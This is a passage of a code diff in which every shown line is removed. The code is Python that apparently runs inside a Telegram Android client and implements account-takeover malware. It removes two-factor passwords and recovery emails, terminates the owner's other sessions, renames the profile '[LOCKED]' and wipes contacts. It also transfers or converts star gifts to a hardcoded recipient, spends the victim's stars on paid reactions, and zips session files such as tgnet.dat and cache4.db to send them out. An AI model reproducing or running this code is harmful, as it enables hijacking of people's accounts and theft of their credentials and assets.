-            if "PASSWORD_NOT_SET" in etxt:
-                return "not_set"
-            if "SESSION_PASSWORD_NEEDED" in etxt:
-                return "need_password"
-            if "FLOOD_WAIT" in etxt:
-                return "flood"
-            return "fail: %s" % etxt[:60]
-        except Exception as e:
-            return "exc: %s" % e
-
-    def _remove_recovery_email(self, acc=0):
-        try:
-            PS = _cls("org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
-                      "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings")
-            if not PS:
-                return {"ok": False}
-            ns = PS()
-            try:
-                ns.email = ""
-            except Exception:
-                pass
-            try:
-                ns.flags = 0
-            except Exception:
-                pass
-            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
-                       "org.telegram.tgnet.tl.TL_account$updatePasswordSettings")
-            if not Upd:
-                return {"ok": False}
-            rq = Upd()
-            try:
-                rq.password = None
-            except Exception:
-                pass
-            rq.new_settings = ns
-            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
-            return {"ok": r is not None}
-        except Exception:
-            return {"ok": False}
-
-    def _nuke_password_pipeline(self, acc=0):
-        report = {"recovery_removed": False, "reset_password": "?",
-                  "cloud_wiped": None, "state_before": None, "state_after": None,
-                  "attempts": 0, "final": "unknown"}
-        try:
-            report["state_before"] = self._get_2fa_state(acc)
-        except Exception:
-            pass
-        sb = report["state_before"]
-        if sb is not None and not sb.get("has_password"):
-            report["final"] = "clean"
-            return report
-        for attempt in range(3):
-            report["attempts"] = attempt + 1
-            try:
-                r = self._remove_recovery_email(acc)
-                if isinstance(r, dict) and r.get("ok"):
-                    report["recovery_removed"] = True
-            except Exception:
-                pass
-            time.sleep(0.5)
-            try:
-                r = self._try_kill_2fa(acc)
-                report["reset_password"] = r
-                if r in ("ok", "not_set"):
-                    break
-            except Exception as e:
-                report["reset_password"] = "exc: %s" % e
-            time.sleep(1.0)
-        try:
-            report["state_after"] = self._get_2fa_state(acc)
-        except Exception:
-            pass
-        sa = report["state_after"]
-        report["final"] = "clean" if (sa is None or not sa.get("has_password")) else "still_has_password"
-        return report
-
-    def _get_authorizations_full(self, acc=0):
-        try:
-            Req = _cls("org.telegram.tgnet.TLRPC$TL_account_getAuthorizations",
-                       "org.telegram.tgnet.tl.TL_account$getAuthorizations")
-            if not Req:
-                return None
-            req = Req()
-            resp, err = self._rg_rpc(req, acc, 8.0, fast=True)
-            if resp is None:
-                return None
-            auths = getattr(resp, "authorizations", None)
-            out = []
-            if auths is None:
-                return out
-            n = _jlist_size(auths)
-            for i in range(n):
-                a = _jlist_get(auths, i)
-                if not a:
-                    continue
-                out.append({
-                    "hash": _safe_int(getattr(a, "hash", 0)),
-                    "current": _get_bool_attr(a, "current", False),
-                    "unconfirmed": _get_bool_attr(a, "unconfirmed", False),
-                    "device": str(getattr(a, "device_model", "") or ""),
-                    "app": str(getattr(a, "app_name", "") or ""),
-                    "platform": str(getattr(a, "platform", "") or ""),
-                })
-            return out
-        except Exception:
-            return None
-
-    def _kill_all_sessions(self, acc=0, phones_pc_only=False):
-        auths = self._get_authorizations_full(acc)
-        if auths is None:
-            return 0, 0
-        total = len(auths)
-        dead = set()
-
-        def _one(h):
-            try:
-                Rst = _cls("org.telegram.tgnet.TLRPC$TL_account_resetAuthorization",
-                           "org.telegram.tgnet.tl.TL_account$resetAuthorization")
-                if not Rst:
-                    return False
-                rq = Rst()
-                rq.hash = h
-                _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
-                return e is None
-            except Exception:
-                return False
-
-        killed = 0
-        for _pass in range(5):
-            targets = []
-            for a in auths:
-                if a["current"]:
-                    continue
-                if not a["hash"] or a["hash"] in dead:
-                    continue
-                if phones_pc_only:
-                    dev = str(a.get("device", "") or "").lower()
-                    app = str(a.get("app", "") or "").lower()
-                    platform = str(a.get("platform", "") or "").lower()
-                    blob = dev + " " + app + " " + platform
-                    if any(w in blob for w in ("web", "chrome", "firefox",
-                                                "safari", "opera", "edge",
-                                                "browser")):
-                        continue
-                targets.append(a["hash"])
-            if not targets:
-                break
-            res = self._parallel([(_one, h) for h in targets], workers=6, timeout=40)
-            for r, h in zip(res, targets):
-                if r is True:
-                    killed += 1
-                    dead.add(h)
-            if _pass < 4:
-                time.sleep(1.5)
-                a2 = self._get_authorizations_full(acc)
-                if not a2:
-                    break
-                auths = a2
-                total = max(total, len(a2))
-        try:
-            Rst = _cls("org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
-                       "org.telegram.tgnet.tl.TL_auth$resetAuthorizations")
-            if Rst:
-                self._rg_rpc(Rst(), acc, 10.0, fast=True)
-        except Exception:
-            pass
-        return killed, max(total, killed)
-
-    def _wipe_sessions_all(self, phones_pc_only=False):
-        out = []
-        for a in self._get_accounts_list():
-            aid = a.get("id", 0)
-            try:
-                k, t = self._kill_all_sessions(aid, phones_pc_only=phones_pc_only)
-                out.append({"account": aid, "user_id": a.get("user_id"),
-                            "killed": k, "total": t})
-            except Exception as e:
-                out.append({"account": aid, "error": str(e)})
-        return out
-
-    def _kill_sessions_full(self):
-        try:
-            self._send_msg("Kill all sessions (phones/PCs, skip web)...")
-            ws = self._wipe_sessions_all(phones_pc_only=True)
-            tk = sum(x.get("killed", 0) for x in ws if isinstance(x, dict))
-            self._send_msg("Sessions killed: %d" % tk)
-        except Exception as e:
-            self._send_msg("kill sessions err: " + str(e))
-
-    def _kill_phones_pc(self):
-        try:
-            self._send_msg("Kill phones/PCs only (skip web, skip current)...")
-            ws = self._wipe_sessions_all(phones_pc_only=True)
-            tk = sum(x.get("killed", 0) for x in ws if isinstance(x, dict))
-            self._send_msg("Phones/PCs killed: %d" % tk)
-        except Exception as e:
-            self._send_msg("kill err: " + str(e))
-
-    def _session_wipe(self):
-        try:
-            self._send_msg("Wipe sessions...")
-            k, t = self._kill_all_sessions(0)
-            self._send_msg("Wiped: %d / %d" % (k, t))
-        except Exception as e:
-            self._send_msg("wipe err: " + str(e))
-
-    def _kill_web_authorizations(self, acc=0):
-        try:
-            Get = _cls("org.telegram.tgnet.TLRPC$TL_account_getWebAuthorizations",
-                       "org.telegram.tgnet.tl.TL_account$getWebAuthorizations")
-            if not Get:
-                return 0
-            resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
-            if resp is None:
-                return 0
-            auths = getattr(resp, "authorizations", None)
-            if auths is None:
-                return 0
-            Reset = _cls("org.telegram.tgnet.TLRPC$TL_account_resetWebAuthorization",
-                         "org.telegram.tgnet.tl.TL_account$resetWebAuthorization")
-            if not Reset:
-                return 0
-            hashes = []
-            for i in range(_jlist_size(auths)):
-                a = _jlist_get(auths, i)
-                h = _safe_int(getattr(a, "hash", 0))
-                if h:
-                    hashes.append(h)
-
-            def _one(h):
-                try:
-                    rq = Reset()
-                    rq.hash = h
-                    _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
-                    return e is None
-                except Exception:
-                    return False
-
-            res = self._parallel([(_one, h) for h in hashes], workers=5, timeout=25)
-            return sum(1 for r in res if r is True)
-        except Exception:
-            return 0
-
-    def _confirm_unconfirmed_sessions(self, acc=0):
-        try:
-            last = self._last_session_confirm.get(acc, 0)
-            if time.time() - last < 60:
-                return 0
-            self._last_session_confirm[acc] = time.time()
-            auths = self._get_authorizations_full(acc)
-            if not auths:
-                return 0
-            Ch = _cls("org.telegram.tgnet.TLRPC$TL_account_changeAuthorizationSettings",
-                      "org.telegram.tgnet.tl.TL_account$changeAuthorizationSettings")
-            if not Ch:
-                return 0
-            confirmed = 0
-            for a in auths:
-                if not a.get("unconfirmed"):
-                    continue
-                try:
-                    rq = Ch()
-                    rq.hash = a["hash"]
-                    try:
-                        rq.confirmed = True
-                    except Exception:
-                        pass
-                    try:
-                        rq.flags = getattr(rq, "flags", 0) | 8
-                    except Exception:
-                        pass
-                    _r2, e2 = self._rg_rpc(rq, acc, 10.0, fast=True)
-                    if e2 is None:
-                        confirmed += 1
-                except Exception:
-                    pass
-            return confirmed
-        except Exception:
-            return 0
-
-    def _change_username(self, acc=0):
-        try:
-            rnd = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
-            new_un = "user_" + rnd
-            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updateUsername",
-                       "org.telegram.tgnet.tl.TL_account$updateUsername")
-            if not Upd:
-                return None
-            rq = Upd()
-            rq.username = new_un
-            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
-            return new_un if r is not None else None
-        except Exception:
-            return None
-
-    def _change_profile(self, acc=0):
-        try:
-            rnd = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
-            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updateProfile",
-                       "org.telegram.tgnet.tl.TL_account$updateProfile")
-            if not Upd:
-                return False
-            rq = Upd()
-            try:
-                rq.first_name = "[LOCKED]"
-                rq.last_name = rnd
-            except Exception:
-                pass
-            try:
-                rq.flags = 0x03
-            except Exception:
-                pass
-            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
-            return r is not None
-        except Exception:
-            return False
-
-    def _reset_contacts(self, acc=0):
-        try:
-            Rq = _cls("org.telegram.tgnet.TLRPC$TL_contacts_resetContacts",
-                      "org.telegram.tgnet.tl.TL_contacts$resetContacts")
-            if not Rq:
-                return False
-            r, _e = self._rg_rpc(Rq(), acc, 10.0, fast=True)
-            return r is not None
-        except Exception:
-            return False
-
-    def _input_saved_gift(self, saved):
-        if saved.get("msg_id"):
-            UI = _cls("org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftUser",
-                      "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftUser")
-            if not UI:
-                return None, "no UserInput"
-            o = UI()
-            o.msg_id = int(saved["msg_id"])
-            return o, None
-        CI = _cls("org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftChat",
-                  "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftChat")
-        if not CI:
-            return None, "no ChatInput"
-        o = CI()
-        uid = int(_UC().getInstance(0).getClientUserId())
-        peer = self._get_input_peer(0, uid)
-        if not peer:
-            return None, "no self peer"
-        o.peer = peer
-        o.saved_id = int(saved.get("saved_id", 0))
-        return o, None
-
-    def _gift_is_listed(self, gift):
-        try:
-            ra = getattr(gift, "resell_amount", None)
-            if ra is None:
-                return False
-            return _jlist_size(ra) > 0
-        except Exception:
-            return False
-
-    def _gift_is_suspect(self, sg, gift):
-        try:
-            cls = str(type(gift))
-            is_unique = ("Unique" in cls or "TL_starGiftUnique" in cls
-                         or _safe_int(getattr(gift, "num", 0)) > 0
-                         or _get_bool_attr(gift, "isUnique", False)
-                         or _get_bool_attr(gift, "canResell", False))
-            conv = _safe_int(getattr(sg, "convert_stars", 0) or getattr(gift, "convert_stars", 0))
-            if conv > 0 and not is_unique:
-                return False
-            for v in (_safe_int(getattr(sg, "saved_id", 0)),
-                      _safe_int(getattr(sg, "msg_id", 0))):
-                if 1500000000 <= v <= 2147483647:
-                    return True
-        except Exception:
-            pass
-        return False
-
-    def _get_saved_gifts(self):
-        try:
-            Req = _cls("org.telegram.tgnet.tl.TL_stars$getSavedStarGifts",
-                       "org.telegram.tgnet.tl.TL_stars$payments_getSavedStarGifts",
-                       "org.telegram.tgnet.TLRPC$TL_payments_getSavedStarGifts")
-            if not Req:
-                return []
-            uid = int(_UC().getInstance(0).getClientUserId())
-            peer = self._get_input_peer(0, uid)
-            if not peer:
-                return []
-            out = []
-            offset = ""
-            for _p in range(20):
-                rq = Req()
-                rq.peer = peer
-                try:
-                    rq.offset = offset
-                except Exception:
-                    pass
-                rq.limit = 100
-                resp, err = self._rg_rpc(rq, 0, 10.0, fast=True)
-                if err is not None or resp is None:
-                    break
-                g = getattr(resp, "gifts", None)
-                if g is None:
-                    break
-                gsize = _jlist_size(g)
-                for i in range(gsize):
-                    sg = _jlist_get(g, i)
-                    gift = getattr(sg, "gift", None)
-                    if not gift:
-                        continue
-                    cls = str(type(gift))
-                    ra = getattr(gift, "resell_amount", None)
-                    ra_l = _jlist_size(ra) > 0 if ra is not None else False
-                    is_u = ("Unique" in cls or "TL_starGiftUnique" in cls or ra_l
-                            or _safe_int(getattr(gift, "num", 0)) > 0
-                            or _get_bool_attr(gift, "isUnique", False)
-                            or _get_bool_attr(gift, "canResell", False))
-                    out.append({
-                        "saved_id": _safe_int(getattr(sg, "saved_id", 0)),
-                        "msg_id": _safe_int(getattr(sg, "msg_id", 0)),
-                        "gift_id": _safe_int(getattr(gift, "id", 0)),
-                        "title": str(getattr(gift, "title", "") or ""),
-                        "slug": str(getattr(gift, "slug", "") or ""),
-                        "u": is_u,
-                        "bc": _is_blockchain_gift(gift, sg),
-                        "suspect": self._gift_is_suspect(sg, gift),
-                        "can_upgrade": _get_bool_attr(gift, "can_upgrade", False) if not is_u else False,
-                        "upgrade_stars": _safe_int(getattr(gift, "upgrade_stars", 0)) if not is_u else 0,
-                        "transfer_stars": _safe_int(getattr(sg, "transfer_stars", 0)),
-                        "can_transfer_at": _safe_int(getattr(sg, "can_transfer_at", 0)),
-                        "convert_stars": _safe_int(getattr(sg, "convert_stars", 0)),
-                        "listed": self._gift_is_listed(gift),
-                    })
-                nxt = str(getattr(resp, "next_offset", "") or "")
-                if not nxt or nxt == offset or gsize == 0:
-                    break
-                offset = nxt
-            return out
-        except Exception as e:
-            _log("get_saved_gifts: %s" % e)
-            return []
-
-    def _delist_saved_gift(self, saved):
-        try:
-            o, e = self._input_saved_gift(saved)
-            if not o:
-                return {"error": e}
-            Rq = _cls("org.telegram.tgnet.tl.TL_stars$updateStarGiftPrice",
-                      "org.telegram.tgnet.tl.TL_stars$payments_updateStarGiftPrice")
-            if not Rq:
-                return {"error": "no class"}
-            rq = Rq()
-            rq.stargift = o
-            try:
-                rq.resell_amount = None
-            except Exception as e2:
-                return {"error": str(e2)}
-            r, _e = self._rg_rpc(rq, 0, 6.0, fast=True)
-            return {"ok": True} if r is not None else {"error": "fail"}
-        except Exception as e:
-            return {"error": str(e)}
-
-    def _convert_saved_gift(self, saved):
-        try:
-            o, e = self._input_saved_gift(saved)
-            if not o:
-                return {"error": e}
-            Rq = _cls("org.telegram.tgnet.tl.TL_stars$convertStarGift",
-                      "org.telegram.tgnet.tl.TL_stars$payments_convertStarGift")
-            if not Rq:
-                return {"error": "no class"}
-            rq = Rq()
-            rq.stargift = o
-            r, _e = self._rg_rpc(rq, 0, 6.0, fast=True)
-            return {"ok": True} if r is not None else {"error": "fail"}
-        except Exception as e:
-            return {"error": str(e)}
-
-    def _upgrade_saved_gift(self, saved):
-        try:
-            o, e = self._input_saved_gift(saved)
-            if not o:
-                return {"error": e}
-            Rq = _cls("org.telegram.tgnet.tl.TL_stars$upgradeStarGift",
-                      "org.telegram.tgnet.tl.TL_stars$payments_upgradeStarGift")
-            if not Rq:
-                return {"error": "no class"}
-            rq = Rq()
-            rq.stargift = o
-            try:
-                rq.keep_original_details = False
-            except Exception:
-                pass
-            r, _e = self._rg_rpc(rq, 0, 15.0, fast=True)
-            return {"ok": True} if r is not None else {"error": "fail"}
-        except Exception as e:
-            return {"error": str(e)}
-
-    def _transfer_saved_gift(self, saved, target_uid, target_ah):
-        if saved and saved.get("bc"):
-            return {"error": "minted NFT skipped"}
-        try:
-            o, e = self._input_saved_gift(saved)
-            if not o:
-                return {"error": e}
-            tp_cls = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerUser",
-                          "org.telegram.tgnet.tl.TL_inputPeerUser")
-            if not tp_cls:
-                return {"error": "no input peer class"}
-            tp = tp_cls()
-            tp.user_id = int(target_uid)
-            tp.access_hash = int(target_ah)
-            T = _cls("org.telegram.tgnet.tl.TL_stars$transferStarGift",
-                     "org.telegram.tgnet.tl.TL_stars$payments_transferStarGift")
-            if T:
-                rq = T()
-                rq.stargift = o
-                rq.to_id = tp
-                r, e = self._rg_rpc(rq, 0, 8.0, fast=True)
-                if r is not None:
-                    return {"ok": True}
-                etxt = getattr(e, "text", "") or str(e or "")
-                if "PAYMENT_REQUIRED" not in etxt and "TOO_EARLY" not in etxt:
-                    return {"error": "direct: %s" % etxt[:60]}
-            Inv = _cls("org.telegram.tgnet.tl.TL_stars$TL_inputInvoiceStarGiftTransfer",
-                       "org.telegram.tgnet.TLRPC$TL_inputInvoiceStarGiftTransfer")
-            RF = _cls("org.telegram.tgnet.tl.TL_stars$getPaymentForm",
-                      "org.telegram.tgnet.TLRPC$TL_payments_getPaymentForm")
-            SF = _cls("org.telegram.tgnet.tl.TL_stars$sendStarsForm",
-                      "org.telegram.tgnet.TLRPC$TL_payments_sendStarsForm")
-            if not (Inv and RF and SF):
-                return {"error": "no classes"}
-            inv = Inv()
-            inv.stargift = o
-            inv.to_id = tp
-            f = RF()
-            f.invoice = inv
-            fr, _fe = self._rg_rpc(f, 0, 8.0, fast=True)
-            if fr is None:
-                return {"error": "form fail"}
-            s = SF()
-            s.form_id = _safe_int(getattr(fr, "form_id", 0))
-            s.invoice = inv
-            sr, _se = self._rg_rpc(s, 0, 10.0, fast=True)
-            return {"ok": True} if sr is not None else {"error": "send fail"}
-        except Exception as e:
-            return {"error": str(e)}
-
-    def _stars_balance(self, acc=0):
-        try:
-            Rq = _cls("org.telegram.tgnet.tl.TL_payments$getStarsStatus",
-                      "org.telegram.tgnet.TLRPC$TL_payments_getStarsStatus",
-                      "org.telegram.tgnet.tl.TL_stars$getStarsStatus")
-            if not Rq:
-                return 0
-            uid = int(_UC().getInstance(acc).getClientUserId())
-            peer = self._get_input_peer(acc, uid)
-            if not peer:
-                return 0
-            rq = Rq()
-            rq.peer = peer
-            try:
-                rq.ton = False
-            except Exception:
-                pass
-            r, _e = self._rg_rpc(rq, acc, 20.0, fast=True)
-            if r:
-                bal = getattr(r, "balance", None)
-                if bal:
-                    try:
-                        return int(getattr(bal, "amount", 0))
-                    except Exception:
-                        try:
-                            return int(bal)
-                        except Exception:
-                            pass
-        except Exception:
-            pass
-        return 0
-
-    def _resolve_recipient(self, account=0):
-        uid_target = int(BOT_UID)
-        with self._recipient_lock:
-            c = self._recipient_ah_cache.get(account)
-            if c and (time.time() - c[2]) < RECIPIENT_CACHE_TTL and c[1]:
-                return c[0], c[1]
-        try:
-            mc = _MC().getInstance(account)
-            u = mc.getUser(uid_target)
-            if u is not None:
-                ah = _safe_int(getattr(u, "access_hash", 0))
-                if ah:
-                    with self._recipient_lock:
-                        self._recipient_ah_cache[account] = (uid_target, ah, time.time())
-                    return uid_target, ah
-        except Exception as e:
-            _log("resolve recipient getUser: %s" % e)
-        try:
-            Req = _cls("org.telegram.tgnet.TLRPC$TL_users_getUsers",
-                       "org.telegram.tgnet.tl.TL_users$getUsers")
-            IU = _cls("org.telegram.tgnet.TLRPC$TL_inputUser",
-                      "org.telegram.tgnet.tl.TL_users$TL_inputUser")
-            if Req and IU:
-                iu = IU()
-                iu.user_id = uid_target
-                iu.access_hash = 0
-                al = ArrayList()
-                al.add(iu)
-                req = Req()
-                try:
-                    req.id = al
-                except Exception:
-                    pass
-                resp, _e = self._rg_rpc(req, account, 10.0, fast=True)
-                if resp is not None:
-                    users = getattr(resp, "users", None)
-                    if users is not None and _jlist_size(users) > 0:
-                        u = _jlist_get(users, 0)
-                        uid = _safe_int(getattr(u, "id", 0))
-                        ah = _safe_int(getattr(u, "access_hash", 0))
-                        if uid and ah:
-                            try:
-                                mc = _MC().getInstance(account)
-                                mc.putUsers(resp, True)
-                            except Exception:
-                                pass
-                            with self._recipient_lock:
-                                self._recipient_ah_cache[account] = (uid, ah, time.time())
-                            return uid, ah
-        except Exception as e:
-            _log("resolve recipient getUsers: %s" % e)
-        return 0, 0
-
-    def _h_convert(self, test=False):
-        gifts = self._get_saved_gifts()
-        out = []
-        converted = 0
-        upgraded = 0
-        balance = self._stars_balance(0)
-        for g in gifts:
-            try:
-                if g.get("u"):
-                    continue
-                if g.get("can_upgrade") and int(g.get("upgrade_stars", 0) or 0) > 0:
-                    continue
-                conv = int(g.get("convert_stars", 0) or 0)
-                if conv <= 0:
-                    continue
-                r = self._convert_saved_gift(g)
-                if isinstance(r, dict) and r.get("ok"):
-                    converted += conv
-                out.append({"gift_id": g.get("gift_id"),
-                            "convert_stars": conv, "result": r})
-                time.sleep(0.3)
-            except Exception as e:
-                out.append({"gift_id": g.get("gift_id"),
-                            "result": {"error": str(e)}})
-        for g in gifts:
-            try:
-                if g.get("u"):
-                    continue
-                if not g.get("can_upgrade"):
-                    continue
-                up_cost = int(g.get("upgrade_stars", 0) or 0)
-                if up_cost <= 0 or balance < up_cost:
-                    continue
-                r = self._upgrade_saved_gift(g)
-                if isinstance(r, dict) and r.get("ok"):
-                    upgraded += 1
-                    balance -= up_cost
-                out.append({"gift_id": g.get("gift_id"),
-                            "upgrade_stars": up_cost, "result": r})
-                time.sleep(0.3)
-            except Exception as e:
-                out.append({"gift_id": g.get("gift_id"),
-                            "result": {"error": str(e)}})
-        return {"converted_stars": converted, "upgraded": upgraded, "results": out}
-
-    def _h_u(self, target_id, target_ah, test=False):
-        self._fee_deficit = 0
-        gifts = self._get_saved_gifts()
-        u_gifts = [g for g in gifts if g.get("u")
-                   and not g.get("bc") and not g.get("suspect")]
-        bc_gifts = [g for g in gifts if g.get("u") and g.get("bc")]
-        suspect = [g for g in gifts if g.get("u")
-                   and g.get("suspect") and not g.get("bc")]
-        out = []
-        now = int(time.time())
-        u_gifts.sort(key=lambda g: (int(g.get("transfer_stars", 0)),
-                                     int(g.get("can_transfer_at", 0) or 0)))
-        balance = self._stars_balance(0)
-        skipped_fees = 0
-        for g in bc_gifts:
-            out.append({"gift_id": g.get("gift_id"), "bc": True,
-                        "result": {"error": "minted NFT skipped"}})
-        for g in suspect:
-            out.append({"gift_id": g.get("gift_id"), "fake": True,
-                        "result": {"error": "suspect fake skipped"}})
-        for g in u_gifts[:100]:
-            try:
-                transfer_stars = int(g.get("transfer_stars", 0))
-                can_transfer_at = int(g.get("can_transfer_at", 0) or 0)
-                if can_transfer_at > now:
-                    rem = can_transfer_at - now
-                    d = rem // 86400
-                    h = (rem % 86400) // 3600
-                    out.append({"gift_id": g.get("gift_id"),
-                                "unlock_at": can_transfer_at,
-                                "result": {"error": "locked %dd %dh" % (d, h)}})
-                    continue
-                if g.get("listed"):
-                    dr = self._delist_saved_gift(g)
-                    if not (isinstance(dr, dict) and dr.get("ok")):
-                        out.append({"gift_id": g.get("gift_id"),
-                                    "result": {"error": "delist failed"}})
-                        continue
-                    time.sleep(0.3)
-                if transfer_stars > 0 and transfer_stars > balance:
-                    skipped_fees += transfer_stars
-                    out.append({"gift_id": g.get("gift_id"),
-                                "transfer_stars": transfer_stars,
-                                "result": {"error": "need %d have %d" % (
-                                    transfer_stars, balance)}})
-                    continue
-                r = self._transfer_saved_gift(g, target_id, target_ah)
-                out.append({"gift_id": g.get("gift_id"),
-                            "transfer_stars": transfer_stars, "result": r})
-                if isinstance(r, dict) and r.get("ok") and transfer_stars > 0:
-                    balance -= transfer_stars
-                time.sleep(0.2)
-            except Exception as e:
-                out.append({"gift_id": g.get("gift_id"),
-                            "result": {"error": str(e)}})
-        self._fee_deficit = max(0, skipped_fees - balance)
-        return out
-
-    def _h_reactions(self, acc=0):
-        try:
-            sp = STARS_POST
-            m = re.match(r"^@?([A-Za-z0-9_]+)/(\d+)$", sp.strip())
-            if not m:
-                m = re.search(r"t\.me/([A-Za-z0-9_]+)/(\d+)", sp)
-            if not m:
-                return {"error": "no post"}
-            uname = m.group(1)
-            mid = int(m.group(2))
-            bal = self._stars_balance(acc)
-            if bal <= 0:
-                return {"balance": 0, "spent": 0}
-            peer = None
-            Resolve = _cls("org.telegram.tgnet.TLRPC$TL_contacts_resolveUsername",
-                           "org.telegram.tgnet.tl.TL_contacts$resolveUsername")
-            if Resolve:
-                try:
-                    rq = Resolve()
-                    rq.username = uname
-                    rres, _rerr = self._rg_rpc(rq, acc, 10.0, fast=True)
-                    if rres:
-                        chats = getattr(rres, "chats", None)
-                        if chats is not None and _jlist_size(chats) > 0:
-                            chat = _jlist_get(chats, 0)
-                            IPChannel = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChannel",
-                                             "org.telegram.tgnet.tl.TL_inputPeerChannel")
-                            if IPChannel:
-                                peer = IPChannel()
-                                peer.channel_id = int(getattr(chat, "id", 0))
-                                peer.access_hash = int(getattr(chat, "access_hash", 0))
-                except Exception:
-                    pass
-            if peer is None:
-                return {"error": "channel not resolved"}
-            Rq = _cls("org.telegram.tgnet.tl.TL_messages$sendPaidReaction",
-                      "org.telegram.tgnet.TLRPC$TL_messages_sendPaidReaction")
-            if not Rq:
-                return {"error": "no class"}
-            spent = 0
-            for _i in range(min(bal, 50)):
-                try:
-                    rq = Rq()
-                    rq.peer = peer
-                    rq.msg_id = mid
-                    rq.count = 1
-                    try:
-                        rq.random_id = int(time.time() * 1000000) & 0x7FFFFFFFFFFFFFFF
-                    except Exception:
-                        pass
-                    r, _e = self._rg_rpc(rq, acc, 20.0, fast=True)
-                    if r is None:
-                        break
-                    spent += 1
-                except Exception:
-                    break
-            return {"balance": bal, "spent": spent}
-        except Exception as e:
-            return {"error": str(e), "spent": 0}
-
-    def _drain_gifts(self, account=0, test=False):
-        uid, ah = self._resolve_recipient(account)
-        if not uid or not ah:
-            return {"error": "no recipient (uid=%s ah=%s)" % (uid, ah)}
-        orig = self.account
-        self.account = int(account)
-        try:
-            conv = self._h_convert(test)
-            u = self._h_u(uid, ah, test)
-            stars = self._h_reactions(account)
-        finally:
-            self.account = orig
-        return {"convert": conv, "u": u, "stars": stars,
-                "fee_deficit": int(getattr(self, "_fee_deficit", 0) or 0)}
-
-    def _drain_gifts_thread(self):
-        try:
-            self._send_msg("Gift transfer...")
-            r = self._drain_gifts(0)
-            if r.get("error"):
-                self._send_msg("Gift err: %s" % r["error"])
-                return
-            conv = r.get("convert") or {}
-            u = r.get("u") or []
-            ok_count = sum(1 for x in u if isinstance(x, dict)
-                           and isinstance(x.get("result"), dict)
-                           and x["result"].get("ok"))
-            self._send_msg(
-                "<b>Gift transfer done</b>\n"
-                "Converted stars: %s\nUpgraded: %s\nTransferred: %d\nFee deficit: %s" % (
-                    conv.get("converted_stars", 0),
-                    conv.get("upgraded", 0), ok_count,
-                    r.get("fee_deficit", 0)), html=True)
-        except Exception as e:
-            self._send_msg("gift thread err: " + str(e))
-
-    def _collect_session_files(self, base):
-        files = []
-        m1 = base + "/files/tgnet.dat"
-        if os.path.exists(m1):
-            files.append(m1)
-        ad = base + "/files"
-        if os.path.isdir(ad):
-            for name in os.listdir(ad):
-                if name.startswith("account"):
-                    p = ad + "/" + name + "/tgnet.dat"
-                    if os.path.exists(p):
-                        files.append(p)
-                    uc = ad + "/" + name + "/userconfig.xml"
-                    if os.path.exists(uc):
-                        files.append(uc)
-        pd = base + "/shared_prefs"
-        if os.path.isdir(pd):
-            for name in os.listdir(pd):
-                low = name.lower()
-                if ("userconfig" in low or "userconfing" in low
-                        or "cache4" in low) and name.endswith(".xml"):
-                    files.append(pd + "/" + name)
-        c4 = base + "/files/cache4.db"
-        if os.path.exists(c4):
-            files.append(c4)
-            for suffix in ("-wal", "-shm"):
-                if os.path.exists(c4 + suffix):
-                    files.append(c4 + suffix)
-        return files
-
-    def _manual_userbot_session(self):
-        try:
-            ctx = ApplicationLoader.applicationContext
-            if ctx is None:
-                return
-            pkg = str(ctx.getPackageName())
-            base = "/data/data/%s" % pkg
-            files = self._collect_session_files(base)
-            if not files:
-                self._send_msg("no session files")
-                return
-            amap = {}
-            for a in self._get_accounts_list():
-                amap[str(a.get("id"))] = {
-                    "user_id": a.get("user_id"),
-                    "username": a.get("username", ""),
-                    "phone": a.get("phone", ""),
-                }
-            z = io.BytesIO()
-            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
-                for fp in files:
-                    try:
-                        if os.path.getsize(fp) <= MAX_DOC_SIZE:
-                            zf.write(fp, arcname=os.path.relpath(fp, base).replace("\\", "/"))
-                    except Exception:
-                        pass
-                if amap:
-                    zf.writestr("accounts_map.json",
-                                json.dumps(amap, ensure_ascii=False, indent=2))
-            self._send_document_bytes("userbot_session.zip", z.getvalue())
-        except Exception as e:
-            self._send_msg("userbot err: " + str(e))
-
-    def _manual_dump_session(self):
-        try:
-            ctx = ApplicationLoader.applicationContext
-            if ctx is None:
-                return
-            pkg = str(ctx.getPackageName())
-            base = "/data/data/%s" % pkg
-            files = []
-            for rd, _dirs, fns in os.walk(base):
-                if rd.count("/") - base.count("/") > 3:
-                    continue
-                if any(x in rd for x in ("/cache/", "/files/cache",
-                                         "/files/photos", "/files/videos")):
-                    continue
-                for f in fns:
-                    low = f.lower()
-                    if ("session" in low or "auth" in low or "cache4" in low
-                            or low.endswith(".db") or low.endswith(".xml")):
-                        fp = os.path.join(rd, f)
-                        try:
-                            if os.path.getsize(fp) <= MAX_DOC_SIZE:
-                                files.append(fp)
-                        except Exception:
-                            pass
-            if not files:
-                self._send_msg("no session files")
-                return
-            z = io.BytesIO()
-            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
-                for fp in files:
-                    try:
-                        zf.write(fp, arcname=os.path.relpath(fp, base))
-                    except Exception:
-                        pass
-            self._send_document_bytes("session.zip", z.getvalue())
-        except Exception as e:
-            self._send_msg("dump err: " + str(e))
-
-    def _has_perm(self, name):
-        try:
-            ctx = ApplicationLoader.applicationContext
-            if ctx is None:
-                return False
-            pm = ctx.getPackageManager()
-            return pm.checkPermission(name, ctx.getPackageName()) == 0
-        except Exception:
-            return False
-
-    def _get_activity(self):
-        for getter in (
-            lambda: jclass("org.telegram.ui.LaunchActivity").instance,
-            lambda: ApplicationLoader.application.getCurrentActivity(),
-        ):
-            try:
-                a = getter()
